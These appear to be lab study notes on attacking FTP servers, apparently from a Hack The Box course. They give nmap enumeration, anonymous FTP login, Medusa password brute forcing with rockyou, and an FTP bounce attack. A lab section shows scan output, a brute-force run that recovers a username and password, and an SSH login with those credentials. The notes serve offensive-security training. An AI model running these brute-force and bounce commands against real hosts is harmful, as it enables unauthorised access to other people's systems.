### Enumeration

**nmap**
```shell-session
datboyblu3@htb[/htb]$ sudo nmap -sC -sV -p 21 192.168.2.142 
```

### Misconfigurations

**Anonymous FTP Authentication**
```
ftp 192.168.1.10
```

	ls and `cd` to move around directories like in Linux. 
	Use `get` to download a single file and `mget` to download multiple files.
	Use `put` for a simple file or `mput` for multiple files.

### Brute Forcing

**Brute Forcing w/ Medusa**

```shell-session
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
```

*NOTE:*  Password spraying is more effective than brute-forcing. Check out [flamingo](https://github.com/atredispartners/flamingo) for all your password spraying needs

**FTP Bounce Attack**

An FTP bounce attack is a network attack that uses FTP servers to deliver outbound traffic to another device on the network. The attacker uses a `PORT` command to trick the FTP connection into running commands and getting information from a device other than the intended server.

```shell-session
datboyblu3@htb[/htb]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```
	NOTE: The -b flag conducts the bounce attack

### Questions

**nmap**

```
Nmap scan report for 10.129.203.6
Host is up (0.050s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
53/tcp   open  domain      ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
2121/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (InlaneFTP) [10.129.203.6]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port2121-TCP:V=7.94SVN%I=7%D=11/27%Time=656502FD%P=aarch64-unknown-linu
SF:x-gnu%r(GenericLines,8B,"220\x20ProFTPD\x20Server\x20\(InlaneFTP\)\x20\
SF:[10\.129\.203\.6\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20mor
SF:e\x20creative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20
SF:creative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2023-11-27T20:58:55
|_  start_date: N/A
|_nbstat: NetBIOS name: ATTCSVC-LINUX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

**FTP NSE Scripts**
```
find / -type f -name ftp* 2>/dev/null | grep scripts
```

**Medusa Brute Forcing**
```
medusa -U users.list -P passwords.list -h 10.129.203.6 -M ftp -n 2121 -L 12
```

Found creds!
```
User: robin Password: 7iz4rnckjsduza7 
```

**SSH into box**
```
ssh robin@10.129.203.6
```


